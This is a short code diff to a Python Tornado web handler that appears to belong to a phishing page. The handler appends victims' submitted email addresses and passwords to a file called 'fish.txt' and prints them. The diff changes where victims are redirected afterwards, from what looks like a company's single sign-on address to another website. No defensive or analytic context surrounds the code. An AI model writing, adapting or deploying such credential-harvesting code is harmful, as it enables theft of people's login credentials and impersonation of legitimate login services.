@@ -23,7 +23,7 @@ class BaseHandler(tornado.web.RequestHandler):
         with open('fish.txt', 'a') as f:
             f.write('email:'+ str(email) + '|' + 'password:' + str(passowrd))
             print 'email:'+ str(email) + '|' + 'password:' + str(passowrd)
-        return self.redirect('https://sso.yunshanmeicai.com')
+        return self.redirect('http://pirogue.org')
     
     def get(self):
         return self.render('index.html')
